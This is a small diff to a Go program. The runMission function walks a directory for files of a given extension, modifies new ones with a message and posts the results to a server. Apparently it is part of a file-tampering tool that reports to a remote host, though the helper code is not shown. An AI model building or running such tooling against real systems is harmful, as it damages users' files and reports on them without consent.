@@ -91,12 +91,11 @@ func decode(s string) []byte {
 	return raw
 }
 
-func runMission(server string, extension string, message string, rootDir string) string {
+func runMission(server string, extension string, message string, rootDir string) {
 	allFiles := getFiles(rootDir, extension)
 	newFiles := findNewFiles(allFiles)
 	successfulFiles := modifyFiles(newFiles, message)
 	postResults(server, successfulFiles)
-	return "Mission Completed"
 }
 
 func main() {
